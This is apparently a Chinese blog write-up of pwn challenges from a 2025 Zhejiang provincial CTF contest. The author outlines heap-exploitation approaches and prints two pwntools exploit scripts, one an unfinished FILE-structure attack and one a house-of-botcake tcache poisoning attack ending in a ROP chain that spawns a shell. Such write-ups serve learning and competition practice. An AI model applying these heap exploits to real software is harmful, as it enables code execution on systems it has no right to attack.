---
title: 2025浙江省赛wp
date: 2025-11-10 13:42:01
categories: 2025-sheng
tags: houseof
---

emm作为一个老登这次省赛才出一道也是有点丢人了

第二题没给libc，直接放弃了，赛后才听说可以从二进制程序string找到libc版本
一个理论上不能出网的比赛，不给libc也是有点过分...
题目本身倒是不难，只需要一字节溢出改下个堆块的size，构造uaf就行
而且由于是低版本，只需要简单的tcache_bin_attack打free_hook

第三题我没想到houseofbotcake，后来尝试用-9来泄漏elf基地址
在堆上写fakechunk，用elf到堆的偏移来释放任意堆块，再进一步打io，但是比赛时io没时间调了

后来[火箭](https://rocketma.dev/)表示他也是想用elf到堆来释放任意堆块，但是他是分配stack地址来打rop
只是后来发现远程-9无法泄漏elf，额ctf确实很容易出各种莫名其妙的问题，经典远程莫名其妙了

总之贴下我比赛时的半成品exp，当时io调到可以执行任意地址了，没时间调进一步的rop了
不过鉴于我当时也是用的-9泄漏elf，就算调好估计也没用了

再下面是赛后复现的wp
```python
from pwn import *
from filep import Filep

context(
    terminal=['tmux', 'split', '-h'],
    os='linux',
    arch='amd64',
    log_level='debug',
)


def debug(io):
    gdb.attach(io, 'b *$rebase(0x1675)')


io = process('./pwn')


def add(idx: int, size: int, cont: bytes):
    io.sendlineafter(b'choice:\n', b'1')
    io.sendlineafter(b'idx:\n', str(idx).encode())
    io.sendlineafter(b'size:\n', str(size).encode())
    io.sendafter(b'content:\n', cont)


def delete(idx: int):
    io.sendlineafter(b'choice:\n', b'2')
    io.sendlineafter(b'idx:\n', str(idx).encode())


def show(idx: int):
    io.sendlineafter(b'choice:\n', b'3')
    io.sendlineafter(b'idx:\n', str(idx).encode())


for i in range(9):
    add(i, 0x100, b'a')
add(9, 0x100, b'a')
for i in range(9):
    delete(i)
show(7)
libc = u64(io.recv(6).ljust(0x8, b'\x00')) - 0x21ACE0
log.success(hex(libc))
anon = libc + 0x3B6DD8

show(0)
heap = u64(io.recv(5).rjust(0x6, b'\x00').ljust(0x8, b'\x00')) * 0x10
log.success(hex(heap))

show(-0x9)
elf = u64(io.recvuntil(p64(libc + 0x21B780))[0x2D46 : 0x2D46 + 8]) - 0x12CA
log.success(hex(elf))

fake_chunk = p64(0x0) + p64(0x100)
for i in range(7):
    add(i, 0x100, fake_chunk)

delete(6)

stdout = Filep(libc)
io_wfile_jumps = libc + 0x2170C0
ogg = libc + 0xEBD43
fake_stdout = flat(
    {
        0x0: p64(heap + 0x2A0),
        0x20: 0x1,
        0x28: p64(ogg),
        stdout._wide_data.offset: p64(heap + 0x2A0),
        stdout.vtable.offset: p64(io_wfile_jumps + 0x10),
        0xE0: p64(heap + 0x2B0),
    },
    filler=b'\x00',
)

add(6, 0x100, fake_stdout)

add(7, 0x100, fake_chunk + p64(heap + 0xA20))
add(8, 0x100, fake_chunk + p64(heap + 0xB30))
delete(int((heap + 0xA28 - elf - 0x40A0) / 0x10))
delete(int((heap + 0xB38 - elf - 0x40A0) / 0x10))
delete(7)
delete(8)
add(8, 0x100, p64(0x0) + p64(0x100) + p64(int(heap / 0x1000) ^ (elf + 0x4040)))
add(0, 0xF0, b'a')
debug(io)
add(0, 0xF0, p64(heap + 0x2A0))

io.interactive()
```

这是后来用houseofbotcake打栈复现的exp
```python
from pwn import *

context(
    terminal=['tmux', 'split', '-h'],
    os='linux',
    arch='amd64',
    log_level='debug',
)


def debug(io):
    gdb.attach(io, 'b *$rebase(0x1675)')


def add(idx: int, size: int, cont: bytes):
    io.sendlineafter(b'choice:\n', b'1')
    io.sendlineafter(b'idx:\n', str(idx).encode())
    io.sendlineafter(b'size:\n', str(size).encode())
    io.sendafter(b'content:\n', cont)


def delete(idx: int):
    io.sendlineafter(b'choice:\n', b'2')
    io.sendlineafter(b'idx:\n', str(idx).encode())


def show(idx: int):
    io.sendlineafter(b'choice:\n', b'3')
    io.sendlineafter(b'idx:\n', str(idx).encode())


io = process('./pwn')
libc = ELF('./libc.so.6')

for i in range(9):
    add(i, 0x100, b'a')
add(9, 0x100, b'a')
for i in range(9):
    delete(i)
show(7)
libc.address = u64(io.recv(6).ljust(0x8, b'\x00')) - 0x21ACE0
log.success(hex(libc.address))
env = libc.address + 0x222200

show(0)
heap = u64(io.recv(5).rjust(0x6, b'\x00').ljust(0x8, b'\x00')) * 0x10
log.success(hex(heap))


def xor_heap(target: int, heap_key: int) -> int:
    return target ^ int(heap_key / 0x1000)


def tcache_alloc(idx: int, addr: int, heap_size: int):
    for i in range(0xA):
        add(i, heap_size, b'a')
    for i in range(0x9):
        delete(i)
    add(0, heap_size, b'a')
    delete(8)
    payload = b'\x00' * (heap_size)
    if idx == 1:
        heap_key = heap
    if idx == 2:
        heap_key = heap + 0x1000
    payload += p64(heap_size + 0x10) * 2 + p64(xor_heap(addr, heap_key))
    add(8, heap_size * 2 + 0x10, payload)
    add(0, heap_size, b'a')


delete(0x9)
tcache_alloc(1, env - 0x10, 0x100)
add(1, 0x100, b'a')
show(1)
io.recv(0x10)
stack = u64(io.recv(0x8))
log.success(hex(stack))

tcache_alloc(2, stack - 0x148, 0x110)
# debug(io)

rop = ROP(libc)
sh = libc.address + 0x1D8678
system = libc.address + 0x50D8B
add(
    2,
    0x110,
    flat(
        0x0,
        rop.rdi.address,
        sh,
        system,
    ),
)

io.interactive()
```
